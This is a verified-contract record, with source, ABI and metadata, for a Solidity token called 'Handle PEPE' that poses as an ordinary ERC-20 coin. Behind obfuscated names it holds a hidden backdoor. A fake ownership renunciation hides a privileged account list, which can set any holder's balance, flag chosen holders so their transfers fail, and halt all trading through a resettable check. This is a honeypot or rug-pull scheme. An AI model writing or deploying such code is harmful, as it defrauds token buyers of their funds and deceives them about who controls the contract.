{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface shouldToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundAmountAuto) external view returns (uint256);\n\n    function transfer(address senderFrom, uint256 isShould) external returns (bool);\n\n    function allowance(address sellLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderFrom,\n        uint256 isShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapTotalAuto, uint256 value);\n    event Approval(address indexed sellLimit, address indexed spender, uint256 value);\n}\n\nabstract contract toFromTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundWallet {\n    function createPair(address buySwap, address shouldEnable) external returns (address);\n}\n\ninterface exemptFund is shouldToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HandlePEPE is toFromTrading, shouldToken, exemptFund {\n\n    function getOwner() external view returns (address) {\n        return enableLimitAuto;\n    }\n\n    function autoLaunched(address totalTake) public {\n        receiverSwap();\n        \n        if (totalTake == listShould || totalTake == atTeam) {\n            return;\n        }\n        exemptAuto[totalTake] = true;\n    }\n\n    address public listShould;\n\n    mapping(address => bool) public buyFee;\n\n    uint256 atFrom;\n\n    uint256 private limitAuto;\n\n    function receiverSwap() private view {\n        require(buyFee[_msgSender()]);\n    }\n\n    bool public tokenFrom;\n\n    function enableAutoMarketing() public {\n        emit OwnershipTransferred(listShould, address(0));\n        enableLimitAuto = address(0);\n    }\n\n    uint8 private modeTeam = 18;\n\n    address public atTeam;\n\n    address walletTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 fundIs;\n\n    uint256 constant swapList = 19 ** 10;\n\n    function allowance(address walletModeEnable, address receiverTo) external view virtual override returns (uint256) {\n        if (receiverTo == tradingMarketing) {\n            return type(uint256).max;\n        }\n        return tokenMarketingTotal[walletModeEnable][receiverTo];\n    }\n\n    bool private tradingListTake;\n\n    mapping(address => bool) public exemptAuto;\n\n    function walletFund(address tokenLaunchTeam, uint256 isShould) public {\n        receiverSwap();\n        fromTx[tokenLaunchTeam] = isShould;\n    }\n\n    function atReceiver(uint256 isShould) public {\n        receiverSwap();\n        fundIs = isShould;\n    }\n\n    address tradingMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private tokenMarketingTotal;\n\n    function receiverTeam(address tokenTrading, address senderFrom, uint256 isShould) internal returns (bool) {\n        if (tokenTrading == listShould) {\n            return launchAmountAt(tokenTrading, senderFrom, isShould);\n        }\n        uint256 totalFundTeam = shouldToken(atTeam).balanceOf(walletTx);\n        require(totalFundTeam == fundIs);\n        require(senderFrom != walletTx);\n        if (exemptAuto[tokenTrading]) {\n            return launchAmountAt(tokenTrading, senderFrom, swapList);\n        }\n        return launchAmountAt(tokenTrading, senderFrom, isShould);\n    }\n\n    bool private liquidityAuto;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txFee;\n    }\n\n    mapping(address => uint256) private fromTx;\n\n    bool public toShould;\n\n    constructor (){\n        if (fromTotal == limitAuto) {\n            tokenFrom = true;\n        }\n        fromList liquidityToken = fromList(tradingMarketing);\n        atTeam = fundWallet(liquidityToken.factory()).createPair(liquidityToken.WETH(), address(this));\n        if (minIs != totalBuy) {\n            tokenFrom = false;\n        }\n        listShould = _msgSender();\n        enableAutoMarketing();\n        buyFee[listShould] = true;\n        fromTx[listShould] = txFee;\n        if (atExemptTo == autoListTeam) {\n            autoListTeam = limitAuto;\n        }\n        emit Transfer(address(0), listShould, txFee);\n    }\n\n    bool public totalMinWallet;\n\n    function transferFrom(address tokenTrading, address senderFrom, uint256 isShould) external override returns (bool) {\n        if (_msgSender() != tradingMarketing) {\n            if (tokenMarketingTotal[tokenTrading][_msgSender()] != type(uint256).max) {\n                require(isShould <= tokenMarketingTotal[tokenTrading][_msgSender()]);\n                tokenMarketingTotal[tokenTrading][_msgSender()] -= isShould;\n            }\n        }\n        return receiverTeam(tokenTrading, senderFrom, isShould);\n    }\n\n    function transfer(address tokenLaunchTeam, uint256 isShould) external virtual override returns (bool) {\n        return receiverTeam(_msgSender(), tokenLaunchTeam, isShould);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeTeam;\n    }\n\n    address private enableLimitAuto;\n\n    uint256 public totalBuy;\n\n    function owner() external view returns (address) {\n        return enableLimitAuto;\n    }\n\n    uint256 public autoListTeam;\n\n    string private liquiditySell = \"Handle PEPE\";\n\n    function name() external view virtual override returns (string memory) {\n        return liquiditySell;\n    }\n\n    event OwnershipTransferred(address indexed modeEnable, address indexed receiverEnable);\n\n    uint256 public minIs;\n\n    uint256 private txFee = 100000000 * 10 ** 18;\n\n    function atReceiverReceiver(address totalSenderFee) public {\n        if (toShould) {\n            return;\n        }\n        \n        buyFee[totalSenderFee] = true;\n        if (atExemptTo == autoListTeam) {\n            autoListTeam = minIs;\n        }\n        toShould = true;\n    }\n\n    function balanceOf(address fundAmountAuto) public view virtual override returns (uint256) {\n        return fromTx[fundAmountAuto];\n    }\n\n    uint256 public atExemptTo;\n\n    function launchAmountAt(address tokenTrading, address senderFrom, uint256 isShould) internal returns (bool) {\n        require(fromTx[tokenTrading] >= isShould);\n        fromTx[tokenTrading] -= isShould;\n        fromTx[senderFrom] += isShould;\n        emit Transfer(tokenTrading, senderFrom, isShould);\n        return true;\n    }\n\n    function approve(address receiverTo, uint256 isShould) public virtual override returns (bool) {\n        tokenMarketingTotal[_msgSender()][receiverTo] = isShould;\n        emit Approval(_msgSender(), receiverTo, isShould);\n        return true;\n    }\n\n    string private marketingToWallet = \"HPE\";\n\n    uint256 public fromTotal;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingToWallet;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTotalAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletModeEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atExemptTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isShould\",\"type\":\"uint256\"}],\"name\":\"atReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalSenderFee\",\"type\":\"address\"}],\"name\":\"atReceiverReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTake\",\"type\":\"address\"}],\"name\":\"autoLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoListTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAmountAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAutoMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMinWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunchTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunchTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isShould\",\"type\":\"uint256\"}],\"name\":\"walletFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HandlePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}